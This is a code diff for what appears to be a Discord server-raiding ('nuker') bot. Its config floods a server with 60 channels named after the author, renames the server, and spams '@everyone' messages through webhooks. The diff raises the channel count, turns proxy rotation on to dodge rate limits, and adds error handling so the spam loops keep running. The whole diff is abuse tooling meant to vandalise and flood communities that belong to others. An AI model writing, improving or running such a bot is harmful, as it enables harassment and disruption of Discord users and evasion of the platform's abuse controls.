@@ -21,10 +21,10 @@ TOKEN = '' #ur BOT token here
 CHANNEL_NAMES = 'K.Dot#0001' #name of the created channels
 MESSAGE = '@everyone K.Dot#0001 was here! ' #message u want ALSO make sure there is a space at the end if your using spam_prn
 PREFIX = 'god ' #ur prefix
-AMMOUNT_OF_CHANNELS = 30 #lol you can go more if u got a good pc
+AMMOUNT_OF_CHANNELS = 60 #lol you can go more if u got a good pc
 SERVER_NAME = 'KDot better' #mad facts cuz
 SPAM_PRN = True #hehehehehehehehehehe
-PROXIES = False #no proxies is a LOT faster but u can get ratelimited faster sometimes so its up to u ALSO PROXIES WILL MESS UP CONSOLE LMAO
+PROXIES = True #no proxies is a LOT faster but u can get ratelimited faster sometimes so its up to u ALSO PROXIES WILL MESS UP CONSOLE LMAO
 LESS_RATE_LIMIT = False #TURN TO TRUE IF YOU WANT TO GET RATE LIMITED LESS. PROXIES IS STILL BETTER THO
 
 #===================CONFIG===================#
@@ -138,30 +138,42 @@ Different Help commands
     await ctx.send(embed=embedVar)
 
 def spamhookp(hook):
-    for i in range(6):
-        for i in range(5):
+    for i in range(5):
+        for i in range(4):
             if SPAM_PRN == True:
-                requests.post(hook, data={'content': MESSAGE + random.choice(list(open('random.txt')))}, proxies=proxy())
+                try:
+                    requests.post(hook, data={'content': MESSAGE + random.choice(list(open('random.txt')))}, proxies=proxy())
+                except:
+                    print(f'error spamming! {hook}')
             else:
-                requests.post(hook, data={'content': MESSAGE}, proxies=proxy())
+                try:
+                    requests.post(hook, data={'content': MESSAGE}, proxies=proxy())
+                except:
+                    print(f'error spamming! {hook}')
             if LESS_RATE_LIMIT == False:
                 continue
             else:
                 time.sleep(0.5)
-    sys.exit(0)
+    sys.exit()
         
 def spamhook(hook):
-    for i in range(6):
-        for i in range(5):
+    for i in range(5):
+        for i in range(4):
             if SPAM_PRN == True:
-                requests.post(hook, data={'content': MESSAGE + random.choice(list(open('random.txt')))})
+                try:
+                    requests.post(hook, data={'content': MESSAGE + random.choice(list(open('random.txt')))})
+                except:
+                    print(f'error spamming! {hook}')
             else:
-                requests.post(hook, data={'content': MESSAGE})
+                try:
+                    requests.post(hook, data={'content': MESSAGE})
+                except:
+                    print(f'error spamming! {hook}')
             if LESS_RATE_LIMIT == False:
                 continue
             else:
                 time.sleep(0.5)
-    sys.exit(0)
+    sys.exit()
 
 if PROXIES == True:
     proxy_scrape()
